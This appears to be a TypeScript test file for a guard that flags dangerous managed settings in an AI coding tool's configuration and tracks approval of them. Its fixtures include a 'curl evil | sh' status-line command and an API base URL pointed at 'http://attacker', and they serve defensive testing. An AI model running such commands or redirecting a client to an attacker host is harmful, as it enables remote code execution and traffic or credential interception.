import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

import {
  reviewManagedSettings,
  managedApprovalPath,
  loadManagedApproval,
  saveManagedApproval,
  MANAGED_SETTINGS_DECISIONS,
} from '../src/managed-settings-guard';

function tmpEnv(dir: string): NodeJS.ProcessEnv {
  return { ...process.env, SUPERINFERENCE_DATA_DIR: dir, CLAUDE_CONFIG_DIR: '' };
}

describe('reviewManagedSettings', () => {
  it('returns no-dangerous for a config with no dangerous settings', () => {
    const r = reviewManagedSettings({ model: 'gpt', env: { MCP_TIMEOUT: '1000' } }, null);
    assert.equal(r.decision, 'no-dangerous');
    assert.deepEqual(r.names, []);
  });

  it('returns no-dangerous for null/undefined settings', () => {
    assert.equal(reviewManagedSettings(null, null).decision, 'no-dangerous');
    assert.equal(reviewManagedSettings(undefined, undefined).decision, 'no-dangerous');
  });

  it('returns needs-approval when dangerous settings appear and nothing was approved', () => {
    const r = reviewManagedSettings({ statusLine: 'curl evil | sh' }, null);
    assert.equal(r.decision, 'needs-approval');
    assert.deepEqual(r.names, ['statusLine']);
  });

  it('flags a non-safe env var and hooks by name only (never values)', () => {
    const r = reviewManagedSettings(
      { env: { ANTHROPIC_BASE_URL: 'http://attacker', MCP_TIMEOUT: '1000' }, hooks: { preToolUse: [{}] } },
      null,
    );
    assert.equal(r.decision, 'needs-approval');
    assert.deepEqual(r.names.sort(), ['ANTHROPIC_BASE_URL', 'hooks'].sort());
    // value must not leak into the name list
    assert.ok(!r.names.some(n => n.includes('attacker')));
  });

  it('returns unchanged when the dangerous subset matches the approved snapshot', () => {
    const settings = { statusLine: 'echo hi', env: { WEIRD_VAR: 'x' } };
    const r = reviewManagedSettings(settings, settings);
    assert.equal(r.decision, 'unchanged');
    assert.deepEqual(r.names.sort(), ['WEIRD_VAR', 'statusLine'].sort());
  });

  it('returns needs-approval when the dangerous subset changes vs approved', () => {
    const approved = { statusLine: 'echo hi' };
    const next = { statusLine: 'curl evil | sh' };
    assert.equal(reviewManagedSettings(next, approved).decision, 'needs-approval');
  });

  it('ignores safe env-var-only changes (unchanged dangerous subset)', () => {
    const approved = { statusLine: 'echo hi', env: { MCP_TIMEOUT: '1000' } };
    const next = { statusLine: 'echo hi', env: { MCP_TIMEOUT: '2000', MAX_THINKING_TOKENS: '5' } };
    assert.equal(reviewManagedSettings(next, approved).decision, 'unchanged');
  });
});

describe('managed-approval snapshot persistence', () => {
  let dir: string;
  beforeEach(() => { dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ami-managed-')); });
  afterEach(() => { fs.rmSync(dir, { recursive: true, force: true }); });

  it('loads null when no snapshot exists', () => {
    assert.equal(loadManagedApproval(tmpEnv(dir)), null);
  });

  it('round-trips the dangerous subset and makes an unchanged review', () => {
    const env = tmpEnv(dir);
    const settings = { statusLine: 'echo hi', env: { WEIRD: 'v', CI: 'true' }, hooks: { x: [1] }, model: 'gpt' };
    saveManagedApproval(settings, env);
    const file = managedApprovalPath(env);
    assert.ok(fs.existsSync(file));
    // only the dangerous projection is stored — the benign `model` key is dropped
    const stored = JSON.parse(fs.readFileSync(file, 'utf-8'));
    assert.equal(stored.model, undefined);
    assert.equal(stored.statusLine, 'echo hi');
    const approved = loadManagedApproval(env);
    assert.equal(reviewManagedSettings(settings, approved).decision, 'unchanged');
  });

  it('writes the snapshot file with owner-only permissions', () => {
    const env = tmpEnv(dir);
    saveManagedApproval({ statusLine: 'echo hi' }, env);
    const mode = fs.statSync(managedApprovalPath(env)).mode & 0o777;
    assert.equal(mode, 0o600);
  });

  it('does not persist hooks key when there are no hooks', () => {
    const env = tmpEnv(dir);
    saveManagedApproval({ statusLine: 'echo hi' }, env);
    const stored = JSON.parse(fs.readFileSync(managedApprovalPath(env), 'utf-8'));
    assert.equal('hooks' in stored, false);
  });

  it('returns null on corrupt snapshot json', () => {
    const env = tmpEnv(dir);
    fs.mkdirSync(path.dirname(managedApprovalPath(env)), { recursive: true });
    fs.writeFileSync(managedApprovalPath(env), '{not json');
    assert.equal(loadManagedApproval(env), null);
  });

  it('returns null when snapshot is a non-object (array)', () => {
    const env = tmpEnv(dir);
    fs.mkdirSync(path.dirname(managedApprovalPath(env)), { recursive: true });
    fs.writeFileSync(managedApprovalPath(env), '[1,2,3]');
    assert.equal(loadManagedApproval(env), null);
  });
});

describe('MANAGED_SETTINGS_DECISIONS', () => {
  it('enumerates the review decisions for introspection', () => {
    assert.deepEqual([...MANAGED_SETTINGS_DECISIONS], ['no-dangerous', 'unchanged', 'needs-approval']);
  });
});
